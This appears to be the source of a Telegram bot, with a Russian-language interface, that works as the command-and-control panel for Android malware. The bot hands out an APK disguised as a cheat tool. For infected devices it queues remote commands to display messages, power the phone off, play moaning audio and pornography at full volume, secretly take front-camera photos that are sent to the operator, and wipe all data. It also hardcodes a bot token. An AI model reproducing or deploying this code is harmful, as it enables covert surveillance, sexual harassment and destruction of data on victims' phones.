const { Telegraf, Markup } = require('telegraf');
const db = require('./db');

const BOT_TOKEN = '9001719911:AAEWc7prrsSLCM917VFtEPi-UNrqfHUCwPg';
const ADMIN_ID  = 920282117;

const bot = new Telegraf(BOT_TOKEN);
const awaiting = {};

function isAdmin(ctx) {
  return ctx.from && ctx.from.id === ADMIN_ID;
}

function devicesMenu() {
  const list = db.listDevices();
  if (!list.length) return Markup.inlineKeyboard([[Markup.button.callback('—', 'noop')]]);
  const rows = list.map(d => ([
    Markup.button.callback(
      `${d.model || 'device'} · ${d.id.slice(0,6)}`,
      `dev:${d.id}`
    )
  ]));
  rows.push([Markup.button.callback('обновить', 'root')]);
  return Markup.inlineKeyboard(rows);
}

function deviceMenu(id) {
  return Markup.inlineKeyboard([
    [Markup.button.callback('написать сообщение', `cmd:${id}:msg`)],
    [Markup.button.callback('выключить на 1 час',  `cmd:${id}:power`)],
    [Markup.button.callback('стоны',              `cmd:${id}:audio`)],
    [Markup.button.callback('порно',              `cmd:${id}:media`)],
    [Markup.button.callback('фото с фронталки',   `cmd:${id}:photo`)],
    [Markup.button.callback('удалить всё',        `cmd:${id}:wipe`)],
    [Markup.button.callback('« назад',            `root`)],
  ]);
}

bot.start((ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.reply('меню', Markup.inlineKeyboard([
    [Markup.button.callback('мои устройства', 'root')],
    [Markup.button.callback('📦 Скачать cheatst2', 'get_apk')]
  ]));
});

bot.action('get_apk', async (ctx) => {
  if (!isAdmin(ctx)) return;
  try {
    await ctx.replyWithDocument({ url: 'https://tnt.de3.netrun.io/cheatst2.apk', filename: 'cheatst2.apk' });
  } catch (e) {
    ctx.reply('Ошибка: файл cheatst2.apk не найден на сервере.');
  }
});

bot.action('root', (ctx) => {
  if (!isAdmin(ctx)) return;
  return ctx.editMessageText('мои устройства', devicesMenu()).catch(()=>{});
});

bot.action('noop', (ctx) => ctx.answerCbQuery().catch(()=>{}));

bot.action(/^dev:(.+)$/, (ctx) => {
  if (!isAdmin(ctx)) return;
  const id = ctx.match[1];
  return ctx.editMessageText(`устройство ${id.slice(0,6)}`, deviceMenu(id)).catch(()=>{});
});

bot.action(/^cmd:([^:]+):(.+)$/, (ctx) => {
  if (!isAdmin(ctx)) return;
  const [, id, cmd] = ctx.match;

  if (cmd === 'msg') {
    awaiting[ctx.chat.id] = { deviceId: id, cmd: 'msg' };
    return ctx.reply('напиши текст, который покажется на устройстве:');
  }
  if (cmd === 'power') {
    const until = Date.now() + 3600 * 1000;
    db.queueCommand(id, 'power', String(until));
    return ctx.answerCbQuery('в очереди: выкл на 1ч');
  }
  if (cmd === 'audio') {
    db.queueCommand(id, 'audio', 'max');
    return ctx.answerCbQuery('в очереди: аудио');
  }
  if (cmd === 'media') {
    db.queueCommand(id, 'media', 'max');
    return ctx.answerCbQuery('в очереди: видео');
  }
  if (cmd === 'photo') {
    db.queueCommand(id, 'photo', 'front');
    return ctx.answerCbQuery('в очереди: фото');
  }
  if (cmd === 'wipe') {
    db.queueCommand(id, 'wipe', '');
    return ctx.answerCbQuery('в очереди: очистка');
  }
  return ctx.answerCbQuery();
});

bot.on('text', (ctx) => {
  if (!isAdmin(ctx)) return;
  const a = awaiting[ctx.chat.id];
  if (a && a.cmd === 'msg') {
    db.queueCommand(a.deviceId, 'msg', ctx.message.text);
    delete awaiting[ctx.chat.id];
    return ctx.reply('в очереди: сообщение');
  }
});

bot.launch();
console.log('bot up');

module.exports = {
  bot,
  notifyAdmin: async (kind, buf, cap) => {
    if (!ADMIN_ID) return;
    if (kind === 'photo') {
      await bot.telegram.sendPhoto(ADMIN_ID, { source: buf }, { caption: cap });
    }
  }
};
